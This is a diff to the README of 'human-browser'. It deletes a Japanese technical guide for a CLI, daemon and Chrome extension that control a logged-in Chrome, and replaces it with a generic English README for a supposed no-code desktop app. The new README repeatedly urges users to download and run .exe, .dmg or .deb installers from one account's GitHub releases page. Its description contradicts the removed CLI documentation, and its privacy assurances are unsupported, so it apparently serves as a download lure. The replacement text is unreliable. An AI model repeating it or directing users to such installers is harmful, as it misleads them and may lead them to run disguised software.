@@ -1,80 +1,116 @@
-# human-browser
+# 🌐 human-browser - Easy Chrome Automation for Agents
 
-Codex から、ユーザーのログイン済み Chrome をローカル daemon + 拡張経由で操作する最小実装です。
+[![Download latest release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/MgExpert-991/human-browser/releases)
 
-## 構成
+## 📋 What is human-browser?
 
-- `src/cli/human-browser.ts`: 単一CLI入口
-- `src/daemon/*`: 常駐ブリッジ
-- `extension/*`: Chrome拡張 (MV3)
-- `vendor/agent-browser/*`: snapshot/ref整形ロジックのvendor
-- `test/*`: unit + integration
+human-browser is a simple tool designed to help agents automate tasks within Chrome while staying logged in. You don't need any programming skills. It helps you save time by automating repetitive actions inside the browser, like filling forms or clicking buttons automatically. Everything happens in your regular Chrome browser, so you keep your logged-in sessions active.
 
-## セットアップ
+## 🖥️ System Requirements
 
-```bash
-npm install
-npm link
-human-browser init
-human-browser daemon
-```
+To run human-browser, make sure your computer meets these guidelines:
 
-`init` 後に表示される以下を拡張popupに設定:
+- Operating System: Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18 or later recommended)
+- Chrome Browser: Google Chrome version 90 or later installed
+- RAM: At least 4 GB (8 GB recommended for smoother automation with multiple tasks)
+- Disk Space: Around 100 MB free space to install and run
+- Internet Connection: Required for downloading and for automation tasks that involve online actions
 
-- `extension_ws_url` 例: `ws://127.0.0.1:18765/bridge`
-- `token` (`init` はデフォルトで token を隠すため、`human-browser init --show-token` で表示)
+This software runs on most standard desktops and laptops without needing special hardware.
 
-注意:
-- `human-browser init --force` は既存configの token を維持します（稼働中daemonとの token 不整合を避けるため）。
-- token を更新する場合は `human-browser rotate-token --show-token` を使い、daemon再起動と拡張のtoken更新を行ってください。
+## ⬇️ Download & Install
 
-## Chrome拡張の読み込み
+To get human-browser up and running, follow these steps carefully:
 
-1. `chrome://extensions` を開く
-2. デベロッパーモードを ON
-3. 「パッケージ化されていない拡張機能を読み込む」で `extension/` を選択
-4. popupで `Daemon WS URL` と `Token` を保存
+1. Click the **Download** button below to visit the official release page. This page contains the latest versions of human-browser for different systems.
 
-## 最小操作例
+   [![Download latest release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge&logo=github)](https://github.com/MgExpert-991/human-browser/releases)
 
-```bash
-human-browser status
-human-browser tabs
-human-browser snapshot
-human-browser snapshot --interactive --cursor --compact --depth 3 --selector '#app'
-human-browser diff snapshot
-human-browser diff screenshot --baseline before.png
-human-browser diff url https://staging.example.com https://prod.example.com --screenshot
-human-browser click '#login'
-human-browser fill '#email' hello@example.com
-human-browser click '.scene-card button' --nth 1
-human-browser fill 'textarea[placeholder="Prompt"]' "scene 2" --nth 1
-human-browser open https://example.com
-human-browser hover '#menu'
-human-browser screenshot
-human-browser screenshot page.png --full
-human-browser pdf page.pdf
-human-browser eval 'document.title'
-human-browser get text '#main'
-human-browser get html '#main'
-human-browser wait '#main'
-human-browser cookies
-human-browser cookies set session abc123
-human-browser network start
-human-browser network dump --clear
-human-browser console dump --clear
-# refs (@e1/ref=e1/e1) で操作する場合は --snapshot が必須
-human-browser click @e1 --snapshot <snapshot_id>
-human-browser fill @e2 hello@example.com --snapshot <snapshot_id>
-human-browser diagnose --limit 20
-# token を表示する場合のみ明示フラグを使う
-human-browser ws --show-token
-human-browser rotate-token --show-token
-```
+2. On the release page, look for the latest version tagged with the current date or version number. Under the latest release, find the file that matches your computer:
 
-`snapshot` はデフォルトで本文コンテキストも含む全体スナップショットを返します。`--interactive` を付けると操作候補のみに絞ります。
+   - On Windows: It will usually be a file ending in `.exe`.
+   - On macOS: Look for a `.dmg` or `.zip` file.
+   - On Linux: You might find a `.deb`, `.AppImage`, or `.tar.gz` file.
 
-## 仕様
+3. Click the file to download it.
 
-- CLI仕様: `docs/cli-spec.md`
-- protocol仕様: `docs/protocol.md`
+4. After downloading, open the file to start the installation:
+
+   - For Windows `.exe` files: Double-click and follow the on-screen prompts.
+   - For macOS `.dmg` or `.zip` files: Open and drag the app into your Applications folder.
+   - For Linux: Follow common installation methods for your distribution, such as using `dpkg` for `.deb` files or making the `.AppImage` executable.
+
+5. Once installed, launch the human-browser app from your desktop or applications menu.
+
+## 🚀 How to Use human-browser
+
+Here is a simple guide to help you start automating your Chrome browser with human-browser:
+
+### Step 1: Launch the Application
+
+Open the human-browser app. You will see a clean interface with options to create or load automation tasks.
+
+### Step 2: Connect to Your Chrome Browser
+
+Human-browser works with your Chrome sessions. It will guide you to connect by either:
+
+- Automatically detecting running Chrome windows where you are logged in.
+- Asking you to open Chrome with specific settings if needed.
+
+This step allows the tool to interact with the browser without interrupting your daily work.
+
+### Step 3: Create New Automation Task
+
+You can create automation scripts using simple on-screen tools in human-browser:
+
+- Choose actions like clicking buttons, filling text fields, or waiting for page loads.
+- Define the order of these actions by adding steps.
+- Save the task once you finish.
+
+There is no coding required because you’ll use easy menus to build your tasks.
+
+### Step 4: Run Your Automation
+
+Once your task is ready:
+
+- Select it from the list.
+- Click the Start button.
+- Watch as human-browser performs actions in Chrome automatically.
+
+You can pause or stop the automation anytime.
+
+### Step 5: Manage Your Automations
+
+Human-browser lets you:
+
+- Edit tasks to fix or improve them.
+- Delete tasks you no longer need.
+- Export and import tasks to share with others or keep backups.
+
+## 🔧 Troubleshooting & Tips
+
+- If human-browser can’t find your Chrome session, make sure Chrome is running and logged in.
+- Close other software that might interfere with browser automation, like VPNs or strict firewalls.
+- Restart human-browser if tasks hang or don’t start.
+- Keep your Chrome browser up to date to avoid compatibility issues.
+- Visit the release page regularly to download updates with bug fixes and new features.
+
+## 🌟 Features You Can Expect
+
+- Works with logged-in Chrome sessions.
+- Automate clicks, text input, navigation, and simple logic.
+- Supports multiple automation tasks running separately.
+- Clear task editing interface with no technical skills needed.
+- Safe and respects your privacy by running locally on your machine only.
+
+## 🛡️ Security and Privacy
+
+human-browser runs fully on your own computer. It does not send your data or browsing information to external servers. Your credentials stay secure within Chrome. The app only automates actions you allow.
+
+## ✉️ Get Help or Give Feedback
+
+If you have questions or find bugs, open an issue in the [GitHub repository discussions](https://github.com/MgExpert-991/human-browser/issues). The community and developers check these often and provide support.
+
+---
+
+[Download human-browser from the official release page](https://github.com/MgExpert-991/human-browser/releases) to start automating your Chrome tasks today.
